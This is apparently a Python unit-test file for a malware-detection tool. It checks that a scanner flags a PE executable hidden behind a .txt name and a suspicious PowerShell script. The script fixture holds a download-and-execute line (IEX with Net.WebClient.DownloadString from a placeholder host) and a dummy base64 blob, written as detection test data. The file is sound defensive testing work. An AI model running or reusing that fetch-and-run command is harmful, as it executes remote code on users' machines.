from pathlib import Path
import struct
from tempfile import TemporaryDirectory
import unittest

from monarch_security.analysis import RuleEngine
from monarch_security.config import load_config
from monarch_security.policy import PolicyEngine
from monarch_security.sensors.files import FileScanner


class DeepFileScanTests(unittest.TestCase):
    def test_pe_hidden_behind_text_extension_scores_high(self):
        with TemporaryDirectory() as directory:
            path = Path(directory) / "invoice.txt"
            path.write_bytes(_minimal_pe())

            config = load_config()
            event = FileScanner(config.files).inspect(path)
            assessment = RuleEngine(config.router).assess(event)

            self.assertEqual(event.facts["magic_type"], "pe")
            self.assertTrue(event.facts["pe_valid"])
            self.assertGreaterEqual(assessment.score, 35)
            self.assertIn(
                "PE executable content is hidden behind a non-PE extension",
                assessment.reasons,
            )

    def test_suspicious_script_markers_route_to_llm_threshold(self):
        with TemporaryDirectory() as directory:
            path = Path(directory) / "update.ps1"
            path.write_text(
                "IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/a.ps1')\n"
                "$d=[Convert]::FromBase64String('"
                + ("A" * 128)
                + "')\n",
                encoding="utf-8",
            )

            config = load_config()
            event = FileScanner(config.files).inspect(path)
            assessment = RuleEngine(config.router).assess(event)

            self.assertIn("script_suspicious_markers", event.facts)
            self.assertTrue(event.facts["script_contains_base64_blob"])
            self.assertGreaterEqual(assessment.score, 65)
            self.assertEqual(assessment.route, "llm")

    def test_file_decision_includes_safe_controls(self):
        with TemporaryDirectory() as directory:
            path = Path(directory) / "payload.exe"
            path.write_bytes(_minimal_pe())

            config = load_config()
            event = FileScanner(config.files).inspect(path)
            assessment = RuleEngine(config.router).assess(event)
            decision = PolicyEngine(config.policy).local_decision(assessment)

            self.assertTrue(decision.controls)
            self.assertTrue(
                any("Defender" in control or "Authenticode" in control for control in decision.controls)
            )


def _minimal_pe() -> bytes:
    data = bytearray(1024)
    data[:2] = b"MZ"
    pe_offset = 0x80
    struct.pack_into("<I", data, 0x3C, pe_offset)
    data[pe_offset : pe_offset + 4] = b"PE\x00\x00"
    struct.pack_into(
        "<HHIIIHH",
        data,
        pe_offset + 4,
        0x8664,
        1,
        0,
        0,
        0,
        0xF0,
        0,
    )
    optional_offset = pe_offset + 24
    struct.pack_into("<H", data, optional_offset, 0x20B)
    struct.pack_into("<H", data, optional_offset + 68, 3)
    section_offset = optional_offset + 0xF0
    data[section_offset : section_offset + 8] = b".text\x00\x00\x00"
    struct.pack_into("<I", data, section_offset + 16, 64)
    struct.pack_into("<I", data, section_offset + 20, 0x300)
    data[0x300 : 0x340] = b"\x90" * 64
    return bytes(data)
